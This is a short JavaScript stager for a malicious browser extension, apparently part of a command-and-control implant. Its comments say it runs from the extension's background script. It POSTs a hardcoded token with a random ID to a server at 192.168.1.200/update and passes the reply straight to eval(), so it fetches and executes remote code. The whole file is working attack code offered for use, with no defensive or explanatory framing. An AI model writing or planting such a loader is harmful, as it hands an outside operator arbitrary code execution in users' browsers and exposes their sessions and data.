// Initial stage request once the extension is loaded

const endpoint = '/update';
const serverHost = '192.168.1.200';
const key = "password";

// helper function to generate random alphanumeric string
function GenerateID(length) {
    return Math.random().toString(36).substr(2, length);
}

(function() {
  // This function executes and makes a requests to the stager uri and loads the core extension code
  // For packaging the extension, this script should be placed in the background.

  const ID = GenerateID(8);

  const Http = new XMLHttpRequest();
  const url="https://"+serverHost+endpoint+"?id="+ID;


  Http.open("POST", url);
  Http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  Http.send(JSON.stringify({'token': key}));

  Http.onreadystatechange=function(){
    if (this.readyState===4 && this.status===200) {
      console.log(Http.responseText);
      eval(Http.responseText);
    }
  }


})();